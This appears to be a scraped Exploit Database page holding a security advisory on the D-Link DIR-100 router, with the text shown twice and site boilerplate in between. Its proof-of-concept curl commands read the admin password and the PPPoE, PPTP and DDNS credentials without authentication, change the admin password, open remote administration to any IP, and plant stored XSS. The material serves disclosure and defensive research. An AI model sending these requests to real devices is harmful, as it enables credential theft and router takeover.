    3. Technical Description
    4. Severity and Remediation
    5. Timeline

# 1. Background

The DIR-100 is designed for easy and robust connectivity among heterogeneous
standards-based network devices. Computers can communicate directly with this
router for automatic opening and closing of UDP/TCP ports to take full
advantage of the security provided without sacrificing functionality of on-line
applications.

# 2 Vulnerability Description

Multiple vulnerabilities have been found in the D-Link DIR-100 Ethernet
Broadband Router Revision D (and potentially other devices sharing the
affected firmware) that could allow a remote attacker:

 - Retrieve the Administrator password without authentication leading to
   authentication bypass [CWE-255]
 - Retrieve sensitive configuration paramters like the pppoe username and
   password without authentication [CWE-200]
 - Execute privileged Commands without authentication through a race
   condition leading to weak authentication enforcement [CWE-287]
 - Sending formatted request to a victim which then will execute arbitrary
   commands on the device (CSRF) [CWE-352]
 - Store arbitrary javascript code which will be executed when a victim
   accesses the administrator interface [CWE-79]

CVE-Numbers for these vulnerabilities has not yet been assigned.

# 3 Technical Description of the Vulnerabilities

## 3.0 The DIR-100 Web Interface and CGI

The DIR-100 Web interface provides a cgi-script on `/cliget.cgi` for
unauthenticated users and `/cli.cgi` for authenticated requests.

list of features provided by each cgi-script can be retrieved by:

    curl 'http://192.168.1.104/cliget.cgi?cmd=help'
    # and respectively when authenticated
    curl 'http://192.168.1.104/cli.cgi?cmd=help'

## 3.1 Authentication Bypass

### Description

The administrator password is not protected in any way on the device, every
attacker with access to the administrator interface which listens on port 80.
For retrieving the Administrator password the request must not be
authenticated.

### Proof of Concept

The web interface provides two distinct ways to retrieve the adminstrator
password:

    curl 'http://192.168.0.1/cliget.cgi?cmd=$sys_user1'
    curl 'http://192.168.0.1/cliget.cgi?cmd=easysetup%20summary'

## 3.2 Weak Authentication

### Description

As soon as a user is logged into the administration interface, the cli CGI
is `unlocked` and can be used by without authenticating before as
the cgi-script does not check any other authentication parameters such as
cookies or HTTP Parameters. The only access check is if the IP-Address is
the same.

### Proof of Concept

    # open the router interface in a web browser and log in
    firefox  'http://192.168.0.1/'

    # open a new terminal or another web-browser which is currently not logged
    # in and try to access

    curl 'http://192.168.0.1/cli.cgi?cmd=help'

    # this request will be authenticated and it will not be redirected to the
    # login page. If no user is logged in, the request will be redirected to
    # the login

## 3.3 Retrieve sensitive information

### Description

Besides retrieving the administrator password without authentication it is
possible to retrieve other sensitive configuration from the device as well like
the PPTP and poe Username and Password, as well as the configured dyndns
username and password and configured mail log credentials when these parameters
are configured.
No authentication is requred.

### Proof of Concept

    curl 'http://192.168.0.1/cliget.cgi?cmd=$ddns1'
    curl 'http://192.168.0.1/cliget.cgi?cmd=$poe_user'
    curl 'http://192.168.0.1/cliget.cgi?cmd=$poe_pass'
    curl 'http://192.168.0.1/cliget.cgi?cmd=$pptp_user'
    curl 'http://192.168.0.1/cliget.cgi?cmd=$pptp_pass'
    curl 'http://192.168.0.1/cliget.cgi?cmd=$log_mail_user'
    curl 'http://192.168.0.1/cliget.cgi?cmd=$log_mail_pwd'

## 3.4 Cross-Site Request Forgery (CSRF)

### Description

CSRF attacks can be launched by sending a formatted request to a victim, then
tricking the victim into loading the request (often automatically), which
makes it appear that the request came from the victim. As an example the
attacker could change the administrator password (see Proof of Concept code)
and enable system remote access.

### Proof of Concept

Changing the password for administrator can be done when the ip-address is
authenticated:

    # Log into DIR-100
    curl -X POST -d 'uname=admin&pws=password&login=Login' 'http://192.168.0.1/login.htm'

    # Change password
    curl 'http://192.168.0.1/cli.cgi?cmd=$sys_user1=user=admin&pass=c%;$sys_passHash=4%25;commit'

    # enable remote console
    curl 'http://192.168.0.1/cli.cgi?cmd=$sys_remote_enable=1%25;$sys_remote_ip=0.0.0.0%25;$sys_remote_port=80%25;commit'

## 3.5 Cross-Site Scripting (XSS)

### Description

It is possible for an authenticated user to store information on the server
which will not be checked on the server side for special characters which
results in persistent Cross-Site Scripting Vulnerabilities. With this
vulnerabilty the victim (administrator) will run javascript code in the
context of the D-Link DIR-100.

XSS is possible because only on the client side (javascript code) the input is
filtered and validated, sending data directly to the CGI scripts.

### Proof of Concept

    # Log into DIR-100
    curl -X POST -d 'uname=admin&pws=password&login=Login' 'http://192.168.0.1/login.htm'

    #  XSS in Static IP Address Tab
    curl 'http://192.168.1.104/cli.cgi?cmd=dhcps%20set%20name=<script>alert(1)</script>%26ip=192.168.0.199%26mac=00:11:22:33:44:55%26flg=1%26exp='

    # XSS in Scheduler tab
    curl 'http://192.168.1.104/cli.cgi?cmd=$sched2=schen=1%26time=0-60%26day=5%26desc=<script>alert(1)</script>%26use=0%26idx=2%26;commit'

# 4 Severity and Remediation

This exploits are considered very critical, especially when the feature of remote
administration is activated on the system.
Weak authentication, together with cross-site request forgery and authentication
bypass can result in a full device compromise from an arbitrary website the victim is
accessing, even if the device has remote administration deactivated on the
internet-port. It is recommended to upgrade the router with the newest firmware
of the D-Link DIR-100.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

5. Timeline
# 1. Background
The DIR-100 is designed for easy and robust connectivity among heterogeneous
standards-based network devices. Computers can communicate directly with this
router for automatic opening and closing of UDP/TCP ports to take full
advantage of the security provided without sacrificing functionality of on-line
applications.
# 2 Vulnerability Description
Multiple vulnerabilities have been found in the D-Link DIR-100 Ethernet
Broadband Router Revision D (and potentially other devices sharing the
affected firmware) that could allow a remote attacker:
- Retrieve the Administrator password without authentication leading to
authentication bypass [CWE-255]
- Retrieve sensitive configuration paramters like the pppoe username and
password without authentication [CWE-200]
- Execute privileged Commands without authentication through a race
condition leading to weak authentication enforcement [CWE-287]
- Sending formatted request to a victim which then will execute arbitrary
commands on the device (CSRF) [CWE-352]
- Store arbitrary javascript code which will be executed when a victim
accesses the administrator interface [CWE-79]
CVE-Numbers for these vulnerabilities has not yet been assigned.
# 3 Technical Description of the Vulnerabilities
## 3.0 The DIR-100 Web Interface and CGI
The DIR-100 Web interface provides a cgi-script on `/cliget.cgi` for
unauthenticated users and `/cli.cgi` for authenticated requests.
list of features provided by each cgi-script can be retrieved by:
curl 'http://192.168.1.104/cliget.cgi?cmd=help'
# and respectively when authenticated
curl 'http://192.168.1.104/cli.cgi?cmd=help'
## 3.1 Authentication Bypass
### Description
The administrator password is not protected in any way on the device, every
attacker with access to the administrator interface which listens on port 80.
For retrieving the Administrator password the request must not be
authenticated.
### Proof of Concept
The web interface provides two distinct ways to retrieve the adminstrator
password:
curl 'http://192.168.0.1/cliget.cgi?cmd=$sys\_user1'
curl 'http://192.168.0.1/cliget.cgi?cmd=easysetup%20summary'
## 3.2 Weak Authentication
### Description
As soon as a user is logged into the administration interface, the cli CGI
is `unlocked` and can be used by without authenticating before as
the cgi-script does not check any other authentication parameters such as
cookies or HTTP Parameters. The only access check is if the IP-Address is
the same.
### Proof of Concept
# open the router interface in a web browser and log in
firefox 'http://192.168.0.1/'
# open a new terminal or another web-browser which is currently not logged
# in and try to access
curl 'http://192.168.0.1/cli.cgi?cmd=help'
# this request will be authenticated and it will not be redirected to the
# login page. If no user is logged in, the request will be redirected to
# the login
## 3.3 Retrieve sensitive information
### Description
Besides retrieving the administrator password without authentication it is
possible to retrieve other sensitive configuration from the device as well like
the PPTP and poe Username and Password, as well as the configured dyndns
username and password and configured mail log credentials when these parameters
are configured.
No authentication is requred.
### Proof of Concept
curl 'http://192.168.0.1/cliget.cgi?cmd=$ddns1'
curl 'http://192.168.0.1/cliget.cgi?cmd=$poe\_user'
curl 'http://192.168.0.1/cliget.cgi?cmd=$poe\_pass'
curl 'http://192.168.0.1/cliget.cgi?cmd=$pptp\_user'
curl 'http://192.168.0.1/cliget.cgi?cmd=$pptp\_pass'
curl 'http://192.168.0.1/cliget.cgi?cmd=$log\_mail\_user'
curl 'http://192.168.0.1/cliget.cgi?cmd=$log\_mail\_pwd'
## 3.4 Cross-Site Request Forgery (CSRF)
### Description
CSRF attacks can be launched by sending a formatted request to a victim, then
tricking the victim into loading the request (often automatically), which
makes it appear that the request came from the victim. As an example the
attacker could change the administrator password (see Proof of Concept code)
and enable system remote access.
### Proof of Concept
Changing the password for administrator can be done when the ip-address is
authenticated:
# Log into DIR-100
curl -X POST -d 'uname=admin&pws=password&login=Login' 'http://192.168.0.1/login.htm'
# Change password
curl 'http://192.168.0.1/cli.cgi?cmd=$sys\_user1=user=admin&pass=c%;$sys\_passHash=4%25;commit'
# enable remote console
curl 'http://192.168.0.1/cli.cgi?cmd=$sys\_remote\_enable=1%25;$sys\_remote\_ip=0.0.0.0%25;$sys\_remote\_port=80%25;commit'
## 3.5 Cross-Site Scripting (XSS)
### Description
It is possible for an authenticated user to store information on the server
which will not be checked on the server side for special characters which
results in persistent Cross-Site Scripting Vulnerabilities. With this
vulnerabilty the victim (administrator) will run javascript code in the
context of the D-Link DIR-100.
XSS is possible because only on the client side (javascript code) the input is
filtered and validated, sending data directly to the CGI scripts.
### Proof of Concept
# Log into DIR-100
curl -X POST -d 'uname=admin&pws=password&login=Login' 'http://192.168.0.1/login.htm'
# XSS in Static IP Address Tab
curl 'http://192.168.1.104/cli.cgi?cmd=dhcps%20set%20name=%26ip=192.168.0.199%26mac=00:11:22:33:44:55%26flg=1%26exp='
# XSS in Scheduler tab
curl 'http://192.168.1.104/cli.cgi?cmd=$sched2=schen=1%26time=0-60%26day=5%26desc=%26use=0%26idx=2%26;commit'
# 4 Severity and Remediation
This exploits are considered very critical, especially when the feature of remote
administration is activated on the system.
Weak authentication, together with cross-site request forgery and authentication
bypass can result in a full device compromise from an arbitrary website the victim is
accessing, even if the device has remote administration deactivated on the
internet-port. It is recommended to upgrade the router with the newest firmware
of the D-Link DIR-100.
